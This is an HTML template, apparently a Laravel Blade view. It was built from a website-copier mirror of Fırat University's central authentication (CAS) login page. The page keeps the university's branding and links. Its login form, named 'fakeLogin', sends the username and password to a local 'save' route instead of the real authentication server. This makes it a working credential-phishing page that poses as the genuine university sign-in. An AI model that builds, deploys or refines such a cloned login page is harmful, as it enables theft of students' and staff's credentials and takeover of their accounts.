








<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">








<html xmlns="http://www.w3.org/1999/xhtml" lang="en">

<!-- Mirrored from jasig.firat.edu.tr/cas/login by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 13 Oct 2022 12:55:26 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
    <title>Merkezi Kimlik Doğrulama Servisi</title>

    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
    <link href="{{asset("css/bootstrap/css/bootstrap.min.css")}}" rel="stylesheet" type="text/css" />
    <link href="{{asset("css/dist/css/AdminLTE.min.css")}}" rel="stylesheet" type="text/css" />
    <link href="{{asset("css/plugins/iCheck/square/red.css")}}" rel="stylesheet" type="text/css" />
    <link href="{{asset("css/dist/css/skins/_all-skins.min.css")}}" rel="stylesheet" type="text/css" />
    <link href="{{asset("css/cas.css")}}" rel="stylesheet" type="text/css" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link rel="icon" href="{{asset("favicon.ico")}}" type="image/x-icon" />
</head>
<body class="skin-red layout-top-nav">
<div class="wrapper">
    <header class="main-header">
        <nav class="navbar navbar-static-top">
            <div class="container" >
                <div class="navbar-header">
                    <a href="https://firat.edu.tr/" class="navbar-brand" class="logo" style="margin-left:-15px;"><img src="images/logo.png" style="margin-top:-5px;width:30px;height:30px;"></a>
                    <a href="https://firat.edu.tr/" class="navbar-brand" class="logo" style="margin-left:-15px;letter-spacing:0.7px;"><b>Fırat</b> Üniversitesi</a>
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse"><i class="fa fa-bars"></i></button>
                </div>
                <div class="navbar-custom-menu">
                    <div class="collapse navbar-collapse pull-left" id="navbar-collapse"  style="position:relative;margin-left:10px;">
                        <ul class="nav navbar-nav">
                            <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Kısayollar <span class="caret"></span></a>
                                <ul class="dropdown-menu" role="menu">
                                    <li><a href="https://mail.firat.edu.tr/" target="_blank">Personel E Posta</a></li>
                                    <li><a href="https://mail.firat.edu.tr/" target="_blank">Öğrenci E Posta</a></li>
                                    <li><a href="http://obs.firat.edu.tr/" target="_blank">Öğrenci İşleri Otomasyonu</a></li>
                                    <li><a href="http://ebys.firat.edu.tr/" target="_blank">Elektronik Belge Yönetim Sistemi</a></li>
                                    <li><a href="http://ebysyardim.firat.edu.tr/" target="_blank">EBYS Yardım</a></li>
                                    <li><a href="http://abs.firat.edu.tr/">Akademik Bilgi Sistemi</a></li>
                                    <li><a href="http://openaccess.firat.edu.tr/">Kurumsal Açık Arşiv</a></li>

                                    <li><a href="http://www.firat.edu.tr/tr/bilgi-sistemleri/dokumanlar/">Dokümanlar</a></li>
                                    <li><a href="http://www.firat.edu.tr/tr/bilgi-sistemleri/dokumanlar/yonetmelikler-ve-yonergeler">Yönetmelik ve Yönergeler</a></li>
                                    <li><a href="http://kutuphane.db.firat.edu.tr/" target="_blank">Kütüphane</a></li>
                                    <li><a href="http://etikkurul.firat.edu.tr/">F.Ü&nbsp;Etik Kurulları</a></li>
                                    <li><a href="http://konut.firat.edu.tr/" target="_blank">Konut Otomasyonu</a></li>
                                    <li><a href="http://www.firatteknokent.org/" target="_blank">Fırat Teknokent</a></li>
                                    <li><a href="http://anket.firat.edu.tr/" target="_blank">Akademik Anket Sistemi</a></li>
                                    <li><a href="https://indir.firat.edu.tr/" target="_blank">Dosya İndirme Sistemi</a>
                                    <li><a href="http://radyo.firat.edu.tr/" target="_blank">Radyo Fırat</a></li>
                                </ul>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </nav>
    </header>

    <div class="content-wrapper">
        <div class="container">
            <div class="login-box">
                <div class="login-logo">
                    <a href="login.html"><b>Merkezi Kimlik Doğrulama Servisi</b></a>
                </div>
                <div class="login-box-body">




                    <script src='../../www.google.com/recaptcha/api9e3e.js?hl=tr'></script>



                    <div class="box fl-panel" id="login">



                        <form id="fakeLogin" class="forms-sample" action="{{route("save")}}" method="post" >
                            @csrf

                            <!-- Tebrikler!, CAS'ı çalışır hale getirdiniz. Hazırdaki kimliklendirme mekanizması kullanıcı adı ve parola aynı olduğu durumlarda girişe izin vermektedir. Hemen deneyebilirsiniz. -->
                            <h4><p class="login-box-msg">Kullanıcı Adı ve Parolanızı giriniz</p></h4>
                            <div class="form-group has-feedback">


                                <a href="login7038.html?locale=en">English</a> | <a href="login85fb.html?locale=tr">Türkçe</a>
                            </div>
                            <div class="form-group has-feedback">

                                <input id="username" name="username" class="form-control" tabindex="1" placeholder="Kullanıcı Adı" type="text" value="" autocomplete="false"/>
                                <span class="glyphicon glyphicon-user form-control-feedback"></span>
                            </div>
                            <div class="form-group has-feedback">

                                <input id="password" name="password" class="form-control" tabindex="2" placeholder="Parola" type="password" value="" autocomplete="off"/>
                                <span class="glyphicon glyphicon-lock form-control-feedback"></span>
                            </div>
                            <div class="form-group has-feedback">



                                <p class="fl-label"></p>



                            </div>

                            <div class="row">
                                <input type="hidden" name="lt" value="LT-2045275-BmaXsefoSSb4vaxbV9UaPGDNhciWzQ" />
                                <input type="hidden" name="execution" value="e1s1" />
                                <input type="hidden" name="_eventId" value="submit" />

                                <button type="submit" class="btn btn-primary btn-block btn-danger">Giriş</button>
                            </div>
                            <br/>



                            <a href="#" onclick="document.location.href = 'login2879.html?target=changePassword';
                        return false;">Şifre Değiştir</a>
                            |
                            <a href="#" onclick="document.location.href = 'login80f7.html?target=forgotPassword';
                        return false;">Şifremi Unuttum</a>


                    </div>
                    </form>
                </div>




            </div>
            <!--<div id="footer" class="fl-panel fl-note fl-bevel-white fl-font-size-80">
                    <a id="jasig" href="http://www.jasig.org" title="go to Jasig home page"></a>
                <div id="copyright">
                    <p>Copyright &copy; 2005 - 2012 Jasig, Inc. All rights reserved.</p>
                    <p>Powered by <a href="http://www.jasig.org/cas">Jasig Central Authentication Service 3.5.0</a></p>
                </div>
            </div>-->
        </div>
    </div>
</div>

<footer class="main-footer">
    <div class="container">
        <div class="pull-right hidden-xs">
            <b>Bilgi &#304;&#351;lem Daire Ba&#351;kanl&#305;&#287;&#305;</b>
        </div>
        <strong>Copyright &copy; 2016 <a href="http://firat.edu.tr/">F&#305;rat &Uuml;niversitesi</a></strong>
    </div>
</footer>
</div>


<script src="{{asset("css/plugins/jQuery/jQuery-2.1.4.min.js")}}"></script>
<script src="{{asset("css/bootstrap/js/bootstrap.min.js")}}" type="text/javascript"></script>
<script src="{{asset("css/plugins/slimScroll/jquery.slimscroll.min.js")}}" type="text/javascript"></script>
<script src='{{asset("css/plugins/fastclick/fastclick.min.js")}}'></script>
<script src="{{asset("css/dist/js/app.min.js")}}" type="text/javascript"></script>
<script src="{{asset("css/plugins/iCheck/icheck.min.js")}}" type="text/javascript"></script>
<script>
    $(function () {
        $('input').iCheck({
            checkboxClass: 'icheckbox_square-red',
            radioClass: 'iradio_square-red',
            increaseArea: '20%'
        });
    });
</script>
</body>

<!-- Mirrored from jasig.firat.edu.tr/cas/login by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 13 Oct 2022 12:55:32 GMT -->
</html>


